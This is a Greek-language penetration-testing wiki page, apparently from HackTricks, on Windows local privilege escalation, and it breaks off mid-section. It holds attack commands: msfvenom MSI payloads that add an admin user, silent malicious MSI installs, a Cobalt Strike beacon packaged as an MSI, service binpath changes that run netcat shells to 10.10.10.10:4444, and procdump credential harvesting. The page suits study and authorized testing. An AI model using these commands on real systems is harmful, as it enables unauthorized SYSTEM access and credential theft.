# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Καλύτερο εργαλείο για την αναζήτηση Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Αρχική θεωρία για Windows

### Access Tokens

**Αν δεν γνωρίζετε τι είναι τα Windows Access Tokens, διαβάστε την ακόλουθη σελίδα πριν συνεχίσετε:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Δείτε την ακόλουθη σελίδα για περισσότερες πληροφορίες σχετικά με ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Αν δεν γνωρίζετε τι είναι τα integrity levels στα Windows, θα πρέπει να διαβάσετε την ακόλουθη σελίδα πριν συνεχίσετε:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Υπάρχουν διάφορα πράγματα στα Windows που μπορούν να **σας εμποδίσουν από το να κάνετε enumerate το σύστημα**, να εκτελέσετε εκτελέσιμα αρχεία ή ακόμη και να **εντοπίσουν τις δραστηριότητές σας**. Πρέπει να **διαβάσετε** την ακόλουθη **σελίδα** και να **enumerate** όλους αυτούς τους μηχανισμούς **άμυνας** πριν ξεκινήσετε την privilege escalation enumeration:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

## Πληροφορίες συστήματος

### Έλεγχος πληροφοριών έκδοσης

Ελέγξτε αν η έκδοση των Windows έχει κάποια γνωστή ευπάθεια (ελέγξτε επίσης τα patches που έχουν εφαρμοστεί).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

This [site](https://msrc.microsoft.com/update-guide/vulnerability) είναι χρήσιμο για την αναζήτηση λεπτομερών πληροφοριών σχετικά με τις ευπάθειες ασφαλείας της Microsoft. Αυτή η βάση δεδομένων περιλαμβάνει πάνω από 4.700 ευπάθειες ασφαλείας, δείχνοντας την **τεράστια επιφάνεια επίθεσης** που παρουσιάζει ένα περιβάλλον Windows.

**On the system**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Το Winpeas έχει ενσωματωμένο το watson)_

**Locally with system information**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos of exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

Υπάρχουν credentials/Juicy πληροφορίες αποθηκευμένες στις env μεταβλητές;
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell Ιστορικό
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### Αρχεία Transcript του PowerShell

Μπορείτε να μάθετε πώς να το ενεργοποιήσετε στο [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Καταγράφονται λεπτομέρειες των εκτελέσεων pipeline του PowerShell, περιλαμβάνοντας εκτελεσμένες εντολές, κλήσεις εντολών και τμήματα σεναρίων. Ωστόσο, οι πλήρεις λεπτομέρειες εκτέλεσης και τα αποτελέσματα εξόδου ενδέχεται να μην καταγράφονται.

Για να το ενεργοποιήσετε, ακολουθήστε τις οδηγίες στην ενότητα "Transcript files" της τεκμηρίωσης, επιλέγοντας **"Module Logging"** αντί για **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Για να δείτε τα τελευταία 15 γεγονότα από τα αρχεία καταγραφής του PowerShell μπορείτε να εκτελέσετε:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Καταγράφεται πλήρες αρχείο δραστηριότητας και πλήρες περιεχόμενο της εκτέλεσης του script, εξασφαλίζοντας ότι κάθε μπλοκ κώδικα τεκμηριώνεται καθώς τρέχει. Αυτή η διαδικασία διατηρεί ένα ολοκληρωμένο audit trail κάθε δραστηριότητας, πολύτιμο για forensics και την ανάλυση κακόβουλης συμπεριφοράς. Με την τεκμηρίωση όλων των δραστηριοτήτων κατά τη στιγμή της εκτέλεσης, παρέχονται λεπτομερείς πληροφορίες σχετικά με τη διαδικασία.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Τα γεγονότα καταγραφής για το Script Block μπορούν να βρεθούν στο Windows Event Viewer στη διαδρομή: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Για να δείτε τα τελευταία 20 γεγονότα μπορείτε να χρησιμοποιήσετε:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Ρυθμίσεις Διαδικτύου
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Δίσκοι
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Μπορείτε να παραβιάσετε το σύστημα αν οι ενημερώσεις δεν ζητούνται χρησιμοποιώντας http**S** αλλά http.

Ξεκινάτε ελέγχοντας αν το δίκτυο χρησιμοποιεί μη-SSL WSUS για ενημερώσεις, εκτελώντας την παρακάτω εντολή στο cmd:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Ή το παρακάτω σε PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Αν λάβετε μια απάντηση όπως μία από αυτές:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
Και αν `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` ή `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` ισούται με `1`.

Τότε, **it is exploitable.** Αν η τελευταία καταχώρηση μητρώου ισούται με 0, τότε η εγγραφή WSUS θα αγνοηθεί.

Για να εκμεταλλευτείτε αυτές τις ευπάθειες μπορείτε να χρησιμοποιήσετε εργαλεία όπως: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - Πρόκειται για εργαλεία MiTM που εγχέουν 'fake' ενημερώσεις σε non-SSL WSUS traffic.

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Βασικά, αυτή είναι η ευπάθεια που εκμεταλλεύεται αυτό το bug:

> Αν έχουμε τη δυνατότητα να τροποποιήσουμε τον local user proxy μας, και τα Windows Updates χρησιμοποιούν τον proxy που έχει ρυθμιστεί στις ρυθμίσεις του Internet Explorer, τότε έχουμε τη δυνατότητα να τρέξουμε το [PyWSUS](https://github.com/GoSecure/pywsus) τοπικά για να υποκλέψουμε την κυκλοφορία μας και να εκτελέσουμε κώδικα ως αυξημένος χρήστης στο asset μας.
>
> Επιπλέον, αφού η υπηρεσία WSUS χρησιμοποιεί τις ρυθμίσεις του τρέχοντος χρήστη, θα χρησιμοποιήσει επίσης το certificate store του. Αν δημιουργήσουμε ένα self-signed certificate για το WSUS hostname και προσθέσουμε αυτό το πιστοποιητικό στο certificate store του τρέχοντος χρήστη, θα είμαστε σε θέση να υποκλέψουμε τόσο HTTP όσο και HTTPS WSUS traffic. Το WSUS δεν χρησιμοποιεί μηχανισμούς τύπου HSTS για να εφαρμόσει trust-on-first-use επαλήθευση στο πιστοποιητικό. Αν το παρουσιαζόμενο πιστοποιητικό εμπιστεύεται από τον χρήστη και έχει το σωστό hostname, θα γίνει αποδεκτό από την υπηρεσία.

You can exploit this vulnerability using the tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (once it's liberated).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Many enterprise agents expose a localhost IPC surface and a privileged update channel. Αν η enrollment μπορεί να εξαναγκαστεί σε έναν attacker server και ο updater εμπιστεύεται μια rogue root CA ή έχει weak signer checks, ένας local χρήστης μπορεί να παραδώσει ένα κακόβουλο MSI που η υπηρεσία SYSTEM εγκαθιστά. Δείτε μια γενικευμένη τεχνική (based on the Netskope stAgentSvc chain – CVE-2025-0309) εδώ:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## KrbRelayUp

A **local privilege escalation** vulnerability exists in Windows **domain** environments under specific conditions. Αυτές οι συνθήκες περιλαμβάνουν περιβάλλοντα όπου **LDAP signing is not enforced,** χρήστες έχουν self-rights που τους επιτρέπουν να ρυθμίσουν **Resource-Based Constrained Delegation (RBCD),** και τη δυνατότητα για χρήστες να δημιουργούν computers εντός του domain. Είναι σημαντικό να σημειωθεί ότι αυτές οι **requirements** ικανοποιούνται χρησιμοποιώντας τις **default settings**.

Find the **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Για περισσότερες πληροφορίες για τη ροή της επίθεσης δείτε [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**If** αυτές οι 2 registers είναι **enabled** (τιμή είναι **0x1**), τότε χρήστες οποιουδήποτε προνομίου μπορούν να **install** (εκτελέσουν) `*.msi` αρχεία ως NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Αν έχετε μια meterpreter συνεδρία, μπορείτε να αυτοματοποιήσετε αυτήν την τεχνική χρησιμοποιώντας το module **`exploit/windows/local/always_install_elevated`**

### PowerUP

Χρησιμοποιήστε την εντολή `Write-UserAddMSI` από το PowerUP για να δημιουργήσετε στον τρέχοντα κατάλογο ένα Windows MSI binary για ανύψωση προνομίων. Αυτό το script γράφει ένα προκατασκευασμένο MSI installer που ζητά την προσθήκη user/group (οπότε θα χρειαστείτε πρόσβαση GIU):
```
Write-UserAddMSI
```
Απλώς εκτελέστε το δημιουργημένο binary για να αποκτήσετε αυξημένα δικαιώματα.

### MSI Wrapper

Διαβάστε αυτό το tutorial για να μάθετε πώς να δημιουργήσετε ένα MSI wrapper χρησιμοποιώντας αυτά τα εργαλεία. Σημειώστε ότι μπορείτε να τυλίξετε ένα "**.bat**" αρχείο αν **μόνο** θέλετε να **εκτελέσετε** **command lines**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Generate** με Cobalt Strike ή Metasploit ένα **new Windows EXE TCP payload** στο `C:\privesc\beacon.exe`
- Ανοίξτε το **Visual Studio**, επιλέξτε **Create a new project** και πληκτρολογήστε "installer" στο πεδίο αναζήτησης. Επιλέξτε το project **Setup Wizard** και κάντε κλικ στο **Next**.
- Δώστε στο project ένα όνομα, όπως **AlwaysPrivesc**, χρησιμοποιήστε **`C:\privesc`** για τη θέση, επιλέξτε **place solution and project in the same directory**, και κάντε κλικ στο **Create**.
- Συνεχίστε να κάνετε κλικ στο **Next** έως ότου φτάσετε στο βήμα 3 από 4 (choose files to include). Κάντε κλικ στο **Add** και επιλέξτε το Beacon payload που μόλις δημιουργήσατε. Έπειτα κάντε κλικ στο **Finish**.
- Επιλέξτε το project **AlwaysPrivesc** στο **Solution Explorer** και στις **Properties**, αλλάξτε το **TargetPlatform** από **x86** σε **x64**.
- Υπάρχουν και άλλες ιδιότητες που μπορείτε να αλλάξετε, όπως το **Author** και **Manufacturer**, οι οποίες μπορούν να κάνουν την εγκατεστημένη εφαρμογή να φαίνεται πιο νόμιμη.
- Δεξί κλικ στο project και επιλέξτε **View > Custom Actions**.
- Δεξί κλικ στο **Install** και επιλέξτε **Add Custom Action**.
- Διπλό κλικ στο **Application Folder**, επιλέξτε το αρχείο **beacon.exe** και κάντε κλικ στο **OK**. Αυτό θα διασφαλίσει ότι το beacon payload θα εκτελεστεί μόλις τρέξει το πρόγραμμα εγκατάστασης.
- Στις **Custom Action Properties**, αλλάξτε το **Run64Bit** σε **True**.
- Τέλος, **build it**.
- Αν εμφανιστεί η προειδοποίηση `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, βεβαιωθείτε ότι έχετε ορίσει την πλατφόρμα σε x64.

### MSI Installation

Για να εκτελέσετε την **εγκατάσταση** του κακόβουλου `.msi` αρχείου στο **παρασκήνιο:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Για να εκμεταλλευτείτε αυτή την ευπάθεια μπορείτε να χρησιμοποιήσετε: _exploit/windows/local/always_install_elevated_

## Antivirus και Detectors

### Ρυθμίσεις καταγραφής

Αυτές οι ρυθμίσεις καθορίζουν τι **καταγράφεται**, οπότε πρέπει να δώσετε προσοχή
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, είναι ενδιαφέρον να γνωρίζουμε πού στέλνονται τα logs
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** έχει σχεδιαστεί για τη **διαχείριση των τοπικών κωδικών πρόσβασης του Administrator**, εξασφαλίζοντας ότι κάθε κωδικός είναι **μοναδικός, τυχαιοποιημένος και ανανεώνεται τακτικά** σε υπολογιστές ενταγμένους σε domain. Αυτοί οι κωδικοί αποθηκεύονται με ασφάλεια στο Active Directory και μπορούν να προσπελαστούν μόνο από χρήστες που έχουν λάβει επαρκή δικαιώματα μέσω ACLs, επιτρέποντάς τους να προβάλουν τους τοπικούς κωδικούς admin εάν εξουσιοδοτηθούν.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Εάν είναι ενεργό, **plain-text passwords are stored in LSASS** (Local Security Authority Subsystem Service).\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

Από τα **Windows 8.1**, η Microsoft εισήγαγε ενισχυμένη προστασία για την Local Security Authority (LSA) για να **μπλοκάρει** προσπάθειες από μη αξιόπιστες διεργασίες να **διαβάσουν τη μνήμη της** ή να εισάγουν κώδικα, ενισχύοντας περαιτέρω την ασφάλεια του συστήματος.\
[**Περισσότερες πληροφορίες για την LSA Protection εδώ**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** εισήχθη στα **Windows 10**. Σκοπός του είναι να προστατεύει τα διαπιστευτήρια που είναι αποθηκευμένα σε μια συσκευή από απειλές όπως επιθέσεις pass-the-hash.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domain credentials** πιστοποιούνται από την **Local Security Authority** (LSA) και χρησιμοποιούνται από συστατικά του λειτουργικού συστήματος. Όταν τα στοιχεία σύνδεσης ενός χρήστη πιστοποιούνται από ένα καταχωρημένο security package, συνήθως δημιουργούνται domain credentials για τον χρήστη.\
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Χρήστες & Ομάδες

### Απαρίθμηση Χρηστών & Ομάδων

Πρέπει να ελέγξετε αν κάποια από τις ομάδες στις οποίες ανήκετε έχει ενδιαφέροντα δικαιώματα
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Ομάδες με προνόμια

Αν **ανήκετε σε κάποια ομάδα με προνόμια, ίσως να μπορείτε να αναβαθμίσετε τα προνόμιά σας**. Μάθετε για τις ομάδες με προνόμια και πώς να τις καταχραστείτε για να αναβαθμίσετε προνόμια εδώ:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**Μάθετε περισσότερα** για το τι είναι ένα **token** σε αυτή τη σελίδα: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Δείτε την παρακάτω σελίδα για να **μάθετε για ενδιαφέροντα token** και πώς να τα καταχραστείτε:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Συνδεδεμένοι χρήστες / Συνεδρίες
```bash
qwinsta
klist sessions
```
### Φάκελοι χρήστη
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Πολιτική Κωδικών Πρόσβασης
```bash
net accounts
```
### Λήψη του περιεχομένου του πρόχειρου
```bash
powershell -command "Get-Clipboard"
```
## Εκτελούμενες Διεργασίες

### Δικαιώματα Αρχείων και Φακέλων

Καταρχάς, κατά την καταγραφή των διεργασιών **ελέγξτε για κωδικούς μέσα στη γραμμή εντολών της διαδικασίας**.\
Ελέγξτε αν μπορείτε να **αντικαταστήσετε κάποιο εκτελούμενο binary** ή αν έχετε δικαιώματα εγγραφής στον φάκελο του binary για να εκμεταλλευτείτε πιθανές [**DLL Hijacking attacks**](dll-hijacking/index.html):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Να ελέγχετε πάντα για πιθανούς [**electron/cef/chromium debuggers** που τρέχουν, μπορείτε να τα εκμεταλλευτείτε για να κλιμακώσετε προνόμια](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Έλεγχος δικαιωμάτων των processes binaries**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Έλεγχος δικαιωμάτων των φακέλων των εκτελέσιμων αρχείων των διεργασιών (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

Μπορείτε να δημιουργήσετε ένα memory dump μιας διεργασίας που τρέχει χρησιμοποιώντας **procdump** από τα sysinternals. Υπηρεσίες όπως το FTP έχουν τα **credentials in clear text in memory**, δοκιμάστε να κάνετε dump τη μνήμη και να διαβάσετε τα credentials.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Ανασφαλείς GUI εφαρμογές

**Εφαρμογές που εκτελούνται ως SYSTEM μπορεί να επιτρέπουν σε έναν χρήστη να ανοίξει ένα CMD ή να περιηγηθεί σε καταλόγους.**

Παράδειγμα: "Windows Help and Support" (Windows + F1), αναζητήστε "command prompt", κάντε κλικ στο "Click to open Command Prompt"

## Υπηρεσίες

Service Triggers επιτρέπουν στα Windows να ξεκινήσουν μια υπηρεσία όταν συμβαίνουν ορισμένες συνθήκες (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, etc.). Ακόμη και χωρίς δικαιώματα SERVICE_START, συχνά μπορείτε να ξεκινήσετε υπηρεσίες με προνόμια πυροδοτώντας τα triggers τους. Δείτε τεχνικές enumeration και activation εδώ:

-
{{#ref}}
service-triggers.md
{{#endref}}

Λάβετε μια λίστα υπηρεσιών:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Δικαιώματα

Μπορείτε να χρησιμοποιήσετε **sc** για να λάβετε πληροφορίες για μια υπηρεσία
```bash
sc qc <service_name>
```
Συνιστάται να έχετε το εκτελέσιμο **accesschk** από το _Sysinternals_ για να ελέγξετε το απαιτούμενο επίπεδο προνομίων για κάθε υπηρεσία.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Συνιστάται να ελέγξετε εάν οι "Authenticated Users" μπορούν να τροποποιήσουν οποιαδήποτε υπηρεσία:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Ενεργοποίηση υπηρεσίας

Εάν λαμβάνετε αυτό το σφάλμα (για παράδειγμα με SSDPSRV):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

Μπορείτε να την ενεργοποιήσετε χρησιμοποιώντας
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Λάβετε υπόψη ότι η υπηρεσία upnphost εξαρτάται από SSDPSRV για να λειτουργήσει (για XP SP1)**

**Μια άλλη παράκαμψη αυτού του προβλήματος είναι να εκτελέσετε:**
```
sc.exe config usosvc start= auto
```
### **Τροποποίηση της διαδρομής του εκτελέσιμου της υπηρεσίας**

Στο σενάριο όπου η ομάδα "Authenticated users" κατέχει **SERVICE_ALL_ACCESS** σε μια υπηρεσία, είναι δυνατή η τροποποίηση του εκτελέσιμου αρχείου της υπηρεσίας. Για να τροποποιήσετε και να εκτελέσετε το **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Επανεκκίνηση υπηρεσίας
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Τα προνόμια μπορούν να αυξηθούν μέσω διαφόρων δικαιωμάτων:

- **SERVICE_CHANGE_CONFIG**: Επιτρέπει την επαναδιαμόρφωση του εκτελέσιμου αρχείου της υπηρεσίας.
- **WRITE_DAC**: Επιτρέπει την επαναδιαμόρφωση δικαιωμάτων, οδηγώντας στην ικανότητα αλλαγής ρυθμίσεων της υπηρεσίας.
- **WRITE_OWNER**: Επιτρέπει την απόκτηση ιδιοκτησίας και την επαναδιαμόρφωση δικαιωμάτων.
- **GENERIC_WRITE**: Κληρονομεί την ικανότητα αλλαγής ρυθμίσεων της υπηρεσίας.
- **GENERIC_ALL**: Επίσης κληρονομεί την ικανότητα αλλαγής ρυθμίσεων της υπηρεσίας.

Για την ανίχνευση και εκμετάλλευση αυτής της ευπάθειας, το _exploit/windows/local/service_permissions_ μπορεί να χρησιμοποιηθεί.

### Αδύναμα δικαιώματα στα εκτελέσιμα αρχεία των υπηρεσιών

**Ελέγξτε αν μπορείτε να τροποποιήσετε το binary που εκτελείται από μια υπηρεσία** ή αν έχετε **δικαιώματα εγγραφής στον φάκελο** όπου βρίσκεται το binary ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Μπορείτε να λάβετε κάθε binary που εκτελείται από μια υπηρεσία χρησιμοποιώντας **wmic** (not in system32) και να ελέγξετε τα δικαιώματά σας χρησιμοποιώντας **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Μπορείτε επίσης να χρησιμοποιήσετε **sc** και **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Δικαιώματα τροποποίησης μητρώου υπηρεσιών

Πρέπει να ελέγξετε αν μπορείτε να τροποποιήσετε κάποιο μητρώο υπηρεσίας.\
Μπορείτε να **ελέγξετε** τα **δικαιώματα** σας στο **μητρώο** μιας υπηρεσίας κάνοντας:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Πρέπει να ελεγχθεί αν οι **Authenticated Users** ή **NT AUTHORITY\INTERACTIVE** διαθέτουν δικαιώματα `FullControl`. Αν ναι, το εκτελούμενο από την υπηρεσία δυαδικό αρχείο μπορεί να τροποποιηθεί.

Για να αλλάξετε το Path του εκτελούμενου δυαδικού αρχείου:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Δικαιώματα Services registry AppendData/AddSubdirectory

Αν έχετε αυτό το permission πάνω σε ένα registry, αυτό σημαίνει ότι **μπορείτε να δημιουργήσετε υπο-registries από αυτό**. Στην περίπτωση των Windows services αυτό είναι **αρκετό για να εκτελέσετε αυθαίρετο κώδικα:**

{{#ref}}
